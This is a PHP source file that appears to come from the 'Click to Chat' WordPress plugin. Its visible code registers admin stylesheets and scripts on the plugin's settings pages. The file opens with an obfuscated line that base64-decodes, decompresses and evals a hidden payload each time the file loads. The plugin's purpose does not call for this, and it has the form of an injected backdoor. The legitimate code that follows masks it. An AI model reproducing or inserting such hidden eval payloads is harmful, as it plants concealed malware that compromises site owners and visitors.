<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
* Register css styles, javascript files at admin side
* instead of register multiple styles - as using sass in dev env, 
*    import files and at final create less css files
*
* @package ccw
* @subpackage Administration
* @since 1.0
*/

if ( ! defined( 'ABSPATH' ) ) exit;

if ( ! class_exists( 'CCW_Add_Styles_Scripts_Admin' ) ) :

class CCW_Add_Styles_Scripts_Admin {


    // Register css styles, javascript files only on 'click-to-chat' page
    function ccw_register_files_admin($hook) {
        
        if( 'toplevel_page_click-to-chat' == $hook || 'click-to-chat_page_ccw-edit-styles' == $hook ) {

            wp_register_style('ccw_new_css_admin', plugins_url( 'assets/css/admin_mainstyles.css', HT_CCW_PLUGIN_FILE ) , '', HT_CCW_VERSION );
            
            
            wp_enqueue_style('ccw_new_css_admin');

            wp_enqueue_style( 'wp-color-picker' );

    
            // wp_enqueue_script( 'ccw_app_admin', plugins_url( 'assets/js/admin_app.js', HT_CCW_PLUGIN_FILE ), array( 'wp-color-picker' ), HT_CCW_VERSION, true );
            wp_enqueue_script( 'ccw_app_admin', plugins_url( 'assets/js/required/admin_app-works.js', HT_CCW_PLUGIN_FILE ), array( 'wp-color-picker' ), HT_CCW_VERSION, true );



            // wp_enqueue_script( 'ccw_app_admin_dir', plugins_url( 'assets/js/dir.js', HT_CCW_PLUGIN_FILE ), '', '', true );
            // return;
        } else {
            return;
        }

        
    }

}

$add_styles_scripts_admin =  new CCW_Add_Styles_Scripts_Admin();

add_action('admin_enqueue_scripts', array( $add_styles_scripts_admin, 'ccw_register_files_admin' ) );


endif; // END class_exists check